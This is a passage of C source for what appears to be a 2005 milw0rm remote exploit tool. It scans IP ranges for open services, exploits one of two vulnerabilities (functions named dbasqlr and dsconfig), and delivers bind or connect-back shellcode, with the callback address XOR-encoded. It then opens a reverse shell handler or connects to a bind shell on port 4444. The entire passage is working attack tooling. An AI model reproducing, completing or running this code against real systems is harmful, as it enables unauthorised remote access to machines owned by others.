										else
										{
											xoredcbip = inet_addr ( argp->lip ) ^ ( unsigned long ) 0x99999999;
											xoredcbport = htons ( argp->lport ) ^ ( unsigned short ) 0x9999;
											if ( exploit_dsconfig ( s, xoredcbip, xoredcbport, 0 ) == 1 )
											{
												printf ( "exploitation failed!\n" );
												exit ( 1 );
											}
											start_reverse_handler ( argp->lport );
											break;
										}
									}
								}
							}
							break;
						}
						case 1:
							printf ( "[%s:%d] " RED "closed" NORMAL "\n", scan_ip, port );
							break;
						default:
							printf ( "[%s:%d] " RED "closed" NORMAL "\n", scan_ip, port );
							break;
					}
					exit(0);
					break;
				}
				case -1:
				{
					printf ( "fork failed!\n");
					exit ( 1 );
					break;
				}
				default:
				{
					if ( i > MAX_CHILDS - 2 )
					{
						wait ( &status );
						i--;
					}
					break;
				}
			}
			if ( ip1 == a && ip2 == b && ip3 == c && ip4 == d )
			{
				close ( fd );
				printf ( "\noO---[   scan completed   ]---Oo\n\n" );
				exit ( 0 );
			}
		}
		ip4 = 1;
		ip3++;
	}
}

void
usage ( char* name )
{
	int i;

	printf ( "\n" );
	printf ( "Note: all switches have to be specified!\n" );
	printf ( "You can choose between bind and cb shellcode later!\n" );
	printf ( "\n" );
	printf ( "Usage: %s -t <tip> -l <cbip> -p <cbport>\n", name );
	printf ( "\n" );
	exit ( 1 );
}

int
main ( int argc, char* argv[] )
{
	int s, action, vuln, sc;
	unsigned long xoredcbip;
	unsigned short xoredcbport;
	args myargs;

	system ( "clear" );
	header ();
	parse_arguments ( argc, argv, &myargs );
	if ( !isip ( myargs.tip ) )
	{
		printf ( "Invalid Target IP!\n" );
		exit ( 1 );
	}
	if ( !isip ( myargs.lip ) )
	{
		printf ( "Invalid Connect Back IP!\n" );
		exit ( 1 );
	}
	action = select_action ();
	if ( !action )
		start_scanner ( &myargs );
	vuln = select_vulnerability ();
	sc = select_shellcode ();
	switch ( vuln )
	{
		case 0:
		{
			s = connect_to_remote_host ( myargs.tip, PORT_DBASQLR );
			switch( sc )
			{
				case 0:
				{
					if ( exploit_dbasqlr ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 ) == 1 )
					{
						printf ( "exploitation failed!\n" );
						exit ( 1 );
					}
					connect_to_bindshell ( myargs.tip, 4444 );
					break;
				}
				case 1:
				{
					xoredcbip = inet_addr ( myargs.lip ) ^ ( unsigned long ) 0x99999999;
					xoredcbport = htons (  myargs.lport ) ^ ( unsigned short ) 0x9999;
					if ( exploit_dbasqlr ( s, xoredcbip, xoredcbport, 0 ) == 1 )
					{
						printf ( "exploitation failed!\n" );
						exit ( 1 );
					}
					start_reverse_handler ( myargs.lport );
					break;
				}
			}
		break;
		}
		case 1:
		{
			s = connect_to_remote_host ( myargs.tip, PORT_DSCONFIG );
			switch( sc )
			{
				case 0:
				{
					if ( exploit_dsconfig ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 ) == 1 )
					{
						printf ( "exploitation failed!\n" );
						exit ( 1 );
					}
					connect_to_bindshell ( myargs.tip, 4444 );
					break;
				}
				case 1:
				{
					xoredcbip = inet_addr ( myargs.lip ) ^ ( unsigned long ) 0x99999999;
					xoredcbport = htons ( myargs.lport ) ^ ( unsigned short ) 0x9999;
					if ( exploit_dsconfig ( s, xoredcbip, xoredcbport, 0 ) == 1 )
					{
						printf ( "exploitation failed!\n" );
						exit ( 1 );
					}
					start_reverse_handler ( myargs.lport );
					break;
				}
			}
		break;
		}
	}
}

// milw0rm.com [2005-08-03]
